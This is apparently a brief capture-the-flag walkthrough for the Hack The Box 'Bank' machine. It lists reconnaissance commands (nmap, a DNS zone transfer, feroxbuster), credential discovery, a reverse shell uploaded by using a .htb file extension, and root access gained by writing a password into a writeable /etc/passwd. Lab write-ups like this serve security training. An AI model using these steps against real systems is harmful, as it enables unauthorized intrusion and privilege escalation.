User FLAG
-----

1. `nmap -T4 --min-rate 5000 -sV -A -o bank 10.10.10.29`
2. Found port 53 open
3. `nslookup 10.10.10.29`
4. `dig axfr bank.htb @10.10.10.29`
5. add domain to `/etc/hosts`
6. enter webpage
7. `feroxbuster --insecure -u http://bank.htb -m GET -w ~/Documents/Security/wordlists/directory_list_lowercase_2.3_medium.txt --threads 200 -C 401`
8. find `balance-transfer` page
9. obtain credentials and login to bank application
10. reverse shell with .htb extension
11. `cat /home/chris/user.txt`

Root FLAG
-----

1. Enumerate the system with `linpeas.sh`
2. Find that `/etc/passwd` is writeable
3. Add password to root user `openssl passwd <password>`
4. Login as root
5. `cat /root/root.txt`

## Versions

OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
Apache/2.4.7 (Ubuntu)
PHP 5.5.9

```bash
whatweb http://bank.htb/login.php               
http://bank.htb/login.php [200 OK] Apache[2.4.7], Bootstrap, Cookies[HTBBankAuth], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], JQuery, PHP[5.5.9-1ubuntu4.21], PasswordField[inputPassword], Script, Title[HTB Bank - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

## Links

- https://garethkerr.substack.com/p/linux-privilege-escalation-exploiting-d1d